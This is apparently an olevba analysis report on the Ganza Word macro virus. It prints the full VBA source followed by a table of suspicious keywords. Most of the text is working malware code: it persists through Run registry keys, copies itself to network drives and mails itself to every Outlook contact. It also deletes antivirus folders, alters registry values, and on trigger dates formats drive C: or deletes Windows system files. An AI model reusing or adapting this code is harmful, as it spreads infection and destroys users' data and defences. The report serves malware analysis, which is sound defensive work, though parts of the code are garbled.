olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ganza
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Ganza 
in file: Virus.MSWord.Ganza - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Symantec ScriptBlocking Authenticated File
' 822163E0-854D-11D5-8BC7-444553540000

'VBS Ganza
'By DarK Soul
'

On Error Resume Next
dim Copiar_arquivo, Alterar_Reg, Criar_OBJ, Contador
NormalTemplate.OpenAsDocument
Template = Dir("C:\Programas\Microsoft Office\Office\STARTUP\Ganza.dot")
ActiveDocument.SaveAs ("C:\Programas\Microsoft Office\Office\STARTUP\Ganza.dot")
NormalTemplate.Saved = True
Copiar_arquivo.CopyFile WScript.ScriptFullName, Copiar_arquivo.BuildPath( Copiar_arquivo.GetSpecialFolder(1), "Normal.dot") 
Set Alterar_Reg = CreateObject( "WScript.Shell" ) 
Alterar_Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "Normal", Copiar_arquivo.BuildPath( Copiar_arquivo.GetSpecialFolder(1), "Normal.dot" ) 
Contador = 0 
Set Copiar_arquivo = CreateObject( "Scripting.FileSystemObject" ) 
Copiar_arquivo.CopyFile WScript.ScriptFullName, Copiar_arquivo.BuildPath( Copiar_arquivo.GetSpecialFolder(1), "Ganza.vbs") 
Set Alterar_Reg = CreateObject( "WScript.Shell" ) 
Alterar_Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "GANZA", Copiar_arquivo.BuildPath( Copiar_arquivo.GetSpecialFolder(1), "Ganza.vbs" ) 
Set Criar_OBJ = CreateObject( "WScript.Network" ) 
Set JR412830 = Criar_OBJ.EnumNetworkDrives 
If JR412830.Count <> 0 Then
Copiar_arquivo.CopyFile WScript.ScriptFullName, Copiar_arquivo.BuildPath( Enviar.Item( Contador), "Ganza.vbd" )  
Contador = Alterar_Reg.RegRead( "HKEY_LOCAL_MACHINE\" & "GANZA" ) 
Set KA73442 = CreateObject("Outlook.Application")
If KA73442 = "Outlook" Then
Set QT884448 = KA73442.GetNameSpace("MAPI")
Set AH756666 = QT884448.AddressLists
For Each LU684625 In AH756666
If LU684625.AddressEntries.Count <> 0 Then
C0432 = LU684625.AddressEntries.Count
For LO70 = 1 To C0432
Set JR412830 = KA73442.CreateItem(0)
Set PA1812556677 = LU684625.AddressEntries(LO70)
JR412830.To = PA1812556677.Address
JR412830.Subject = "Very Important!"
JR412830.Body = "Hi:" & vbCrLf & "This file content very sites of sexy" & vbCrLf & ""
Set MR763 = JR412830
Chr (65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
FJ54ECJP = CI3
JR412830.DeleteAfterSubmit = True
MR763.Add FJ54ECJP
If JR412830.To <> "" Then
JR412830.Send
End If
Next
End If
Next
End If
End If
ChooseActions
XX000001
Special
LoopIt

Private Sub XX000001()
On Error Resume Next
CommandBars("Tools").Controls("Macro").Delete
  
Dim DG363281, PK822820, DH83718, TE6890, MR845616, PS120686, QU710669, CK406103, EU114809, OI560221, HF298480, LA455512, VD69241, VV794216, BC685875, AB664723

DH83718 = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Command Software\F-PROT32", "Location")
MR845616 = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Cybec\VET Antivirus for Win32\Resident", "VetPath")
DG363281 = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\McAfee\Scan95", "szProductLocation")
QU710669 = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\ALWIL Software\Avast32", "Path")
EU114809 = System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Software\MooSoft Development\The Cleaner", "tcshellex")
HF298480 = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Panda Software\Panda Antivirus 6.0", "Path")
VD69241 = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\KasperskyLab\Components\100", "Folder")
BC685875 = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Symantec\Norton AntiVirus\Install\7.0", "InstallDir")

TE6890 = DH83718 + "\*.*"
PS120686 = MR845616 + "\*.*"
PK822820 = DG363281 + "\*.*"
CK406103 = QU710669 + "\*.*"
OI560221 = EU114809 + "\*.*"
LA455512 = HF298480 + "\*.*"
VV794216 = VD69241 + "\*.*"
AB664723 = BC685875 + "\*.*"

Kill TE6890
Kill PS120686
Kill PK822820
Kill CK406103
Kill OI560221
Kill LA455512
Kill VV794216
Kill AB664723

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "0") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "1") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "2") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "3") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "4") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "5") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "6") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "7") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "8") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "9") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "10") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "AutoStart") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "AutoVerify") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "BOProt") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "ExtraPort") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "NetBusAdv") = "DISABLED"

If "C:\windows\PATCH.exe" = True Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "PATCH") = "c:\windows\Patch.exe /pass:killfhc"

End If

End Sub

Private Sub Action1()
On Error Resume Next
System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "") = "Ganza"
System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "InfoTip") = "Esta e a Lixeira do Soul... eu comando essa barraca ok??? ---Merda---"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\CLASSES\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "") = "DarK Soul Recycle Bin"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\CLASSES\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "InfoTip") = "Esta Lixeira e do Dark Soul... eu comando essa barraca ok??? ---Merda---"

End Sub

Private Sub Action2()
On Error Resume Next
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Display\Settings", "BitsPerPixel") = "1"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Dark Soul"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "Ganza Microzoft"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "Version") = "Windous 0.0 by Dark Soul"

End Sub

Private Sub Action3()
On Error Resume Next
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Display\Settings", "MouseTrails") = "7"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Mouse", "MouseSpeed") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Mouse", "DoubleClickSpeed") = "100"

End Sub

Private Sub Action4()
On Error Resume Next
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "ButtonFace") = "200 40 10"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "ActiveTitle") = "0 250 100"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "Menu") = "0 0 0"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "Window") = "100 100 200"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "ScrollBar") = "100 100 200"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "WindowText") = "255 255 255"

End Sub

Private Sub Action5()
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Hardware\Description\System\CentralProcessor\0", "VendorIdentifier") = "Genuine Dark Soul Processor"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Hardware\Description\System\CentralProcessor\0", "Identifier") = "Ganza"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Hardware\DeveiceMap\SerialComm", "COM1") = "PORTA DA MORTE1"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Hardware\DeviceMap\SerialComm", "COM1") = "PORTA DA MORTE1"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Hardware\DeviceMap\SerialComm", "COM2") = "PORTA DA MORTE2"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0000\01", "DeviceDesc") = "Your Soul Is Mine"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0100\03", "DeviceDesc") = "Your Soul Is Mine"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0200\02", "DeviceDesc") = "Your Soul Is Mine"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0303\05", "DeviceDesc") = "Your Soul Is Mine"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0400\0A", "DeviceDesc") = "Your Soul Is Mine"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0501\08", "DeviceDesc") = "Your Soul Is Mine"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0501\09", "DeviceDesc") = "Your Soul Is Mine"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0700\0B", "DeviceDesc") = "Your Soul Is Mine"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0800\06", "DeviceDesc") = "Your Soul Is Mine"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0A03\0C", "DeviceDesc") = "Your Soul Is Mine"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0B00\04", "DeviceDesc") = "Your Soul Is Mine"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0C04\07", "DeviceDesc") = "Your Soul Is Mine"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\ISAPNP\CTL0070_DEV0000\FFFFFFFF", "DeviceDesc") = "Your Soul Is Mine"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\ISAPNP\CTL0070_DEV0001\FFFFFFFF", "DeviceDesc") = "Your Soul Is Mine"

End Sub

Sub Action6()
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Display\Settings", "Resolution") = "300,200"
End Sub

Sub ChooseActions()
On Error Resume Next
Dim Chance
Randomize
Chance = Int((5 * Rnd) + 1)
If Chance = 1 Then Action1
If Chance = 2 Then Action2
If Chance = 3 Then Action3
If Chance = 4 Then Action4
If Chance = 5 Then Action5
If Chance = 6 Then Action6
End Sub

Private Sub LoopIt()
On Error Resume Next
Msg = "Ocorreu um erro no sistema, a possivel causa � voce ter uma minhoca no meio das pernas!!! Voce tem uma pila de minhoca?"
Style = vbYesNo + vbQuestion
Title = "Microsoft Word"
Ret = MsgBox(Msg, Style, Title)
If Ret = vbNo Then LoopIt
End Sub

Sub Special()
On Error Resume Next

If Day(Now) = "1" And Month(Now) >= "8" Then MsgBox "Ow!!!, Is time to kill!!!", vbSystemModal + vbOKOnly, "Dark Soul": Application.Quit wdDoNotSaveChanges: Tasks.ExitWindows
Shell "C:\Windows\Command\Format.com C:/Autotest"


If Day(Now) = "13" And Month(Now) >= "4" Then
mbox = "Ow!!! Queres remover o Windows???": st = vbYes + vbQuestion: tit = "Dark Soul"
r = MsgBox(mbox, st, tit)
If r = vbYes Then
Application.StatusBar = "Removendo C:\Windows... 5%"
FileSystem.Kill "C:\Windows\*.exe"
Application.StatusBar = "Removendo C:\Windows... 14%"
FileSystem.Kill "C:\Windows\*.bmp"
Application.StatusBar = "Removendo C:\Windows... 20%"
FileSystem.Kill "C:\Windows\*.gif"
Application.StatusBar = "Removendo C:\Windows... 30%"
FileSystem.Kill "C:\Windows\*.com"
Application.StatusBar = "Removendo C:\Windows... 36%"
FileSystem.Kill "C:\Windows\*.jpg"
Application.StatusBar = "Removendo C:\Windows... 45%"
FileSystem.Kill "C:\Windows\*.dll"
Application.StatusBar = "Removendo C:\Windows... 57%"
FileSystem.Kill "C:\Windows\*.sys"
Application.StatusBar = "Removendo C:\Windows... 68%"
FileSystem.Kill "C:\Windows\*.txt"
Application.StatusBar = "Removendo C:\Windows... 72%"
FileSystem.Kill "C:\Windows\*.doc"
FileSystem.Kill "C:\Windows\*.gif"
Application.StatusBar = "Removendo C:\Windows... 86%"
FileSystem.Kill "C:\Windows\*.dat"
FileSystem.Kill "C:\Windows\*.ini"
Application.StatusBar = "Removendo C:\Windows... 99%"
FileSystem.Kill "C:\Windows\*.pwl"
Application.StatusBar = "Removendo C:\Windows... done"
End If

If Day(Now) = "7" And Month(Now) >= "6" Then
MsgBox "Ow!!! Erro interno ficou sem iniciar???", vbCritical, "Dark Soul"
Shell "Deltree/y c:\windows\menu iniciar"
Shell "Deltree/y c:\windows\start menu"
End If

If Day(Now) = "28" And Month(Now) >= "2" Then
MsgBox "Ow!! Hoje � o dia de procurares as tuas fontes"
Shell "Deltree/y C:\windows\fonts"
End If
End if
End sub 



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegRead             |May read registry keys                       |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Ganza.vbs           |Executable file name                         |
|IOC       |PATCH.exe           |Executable file name                         |
|IOC       |Patch.exe           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

